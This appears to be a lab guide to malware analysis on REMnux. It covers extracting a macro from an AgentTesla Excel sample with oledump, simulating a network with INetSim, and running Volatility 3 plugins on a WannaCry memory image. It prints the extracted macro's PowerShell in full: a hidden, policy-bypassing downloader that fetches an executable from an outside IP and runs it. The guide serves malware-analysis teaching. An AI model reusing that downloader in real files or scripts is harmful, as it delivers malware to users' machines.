
# REMnux: Getting Started

## Overview
The REMnux VM is a Linux distro specialized for malware analysis, featuring tools like Volatility, YARA, Wireshark, oledump, and INetSim. This guide covers analyzing a malicious Excel document, simulating a network environment with INetSim, and memory analysis with Volatility.

---

## Static Analysis with oledump.py

### Target File
- **Path:** `/home/ubuntu/Desktop/tasks/agenttesla/`
- **File:** `agenttesla.xlsm`

### Steps:
1. **List streams:**
   ```bash
   oledump.py agenttesla.xlsm
   ```
   Key macro stream: `A4: M 688 'VBA/ThisWorkbook'`

2. **Extract and decompress macro:**
   ```bash
   oledump.py agenttesla.xlsm -s 4 --vbadecompress
   ```

### Extracted PowerShell Code:
```powershell
powershell -WindowStyle hidden -executionpolicy bypass; 
$TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru; 
Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile; 
Start-Process $TempFile;
```

---

## Simulated Network with INetSim

### Configuration
- Edit `/etc/inetsim/inetsim.conf`:
  ```bash
  dns_default_ip MACHINE_IP
  ```

- Start INetSim:
  ```bash
  sudo inetsim
  ```

### Simulate Malware Behavior (AttackBox)
- Download via CLI:
  ```bash
  sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
  sudo wget https://MACHINE_IP/second_payload.ps1 --no-check-certificate
  ```

### INetSim Report
- Location: `/var/log/inetsim/report/`
- View Report:
  ```bash
  sudo cat /var/log/inetsim/report/report.<session_id>.txt
  ```

---

## Memory Analysis with Volatility 3

### Memory Image
- **Path:** `/home/ubuntu/Desktop/tasks/Wcry_memory_image/`
- **File:** `wcry.mem`

### Useful Plugins:
```bash
vol3 -f wcry.mem windows.pstree.PsTree
vol3 -f wcry.mem windows.pslist.PsList
vol3 -f wcry.mem windows.cmdline.CmdLine
vol3 -f wcry.mem windows.filescan.FileScan
vol3 -f wcry.mem windows.dlllist.DllList
vol3 -f wcry.mem windows.psscan.PsScan
vol3 -f wcry.mem windows.malfind.Malfind
```

Each plugin reveals different aspects of the memory image to assist in threat analysis.

---

## Summary
- Macros in Excel files can execute hidden PowerShell commands.
- INetSim simulates a network for observing malware behavior.
- Volatility 3 is key for forensic memory analysis.
